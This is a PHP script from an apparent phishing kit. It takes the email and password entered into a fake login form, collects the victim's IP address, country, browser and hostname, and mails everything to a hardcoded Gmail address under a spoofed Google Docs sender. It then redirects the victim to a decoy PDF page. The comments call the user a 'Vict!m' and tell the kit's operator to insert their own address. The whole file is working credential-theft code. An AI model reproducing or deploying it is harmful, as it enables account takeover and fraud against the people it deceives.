<?php
if($_POST["frm-email"] != "" and $_POST["frm-pass"] != ""){
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Wires Info-----------------------\n";
$message .= "|eMail : ".$_POST['frm-email']."\n";
$message .= "|PasSword : ".$_POST['frm-pass']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "----------------------------\n";
//change ur email here
$sent ="rodstw1@gmail.com";


$subject = "Result - ".$country;
$headers = "From: Bless UP<wirez@googledocs.org>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
if(preg_match("/@gmail\.com$/", urldecode($_POST['frm-email'])))
    {
	mail($sent,$subject,$message,$headers);header("Location: ver.pdf.html");exit;
    }else{mail($sent,$subject,$message,$headers);}

 
     header("Location: https://www.docdroid.net/6Eyq7po/bcreg20160629a1.pdf.html");
}else{
header("Location: index.php");
}

?>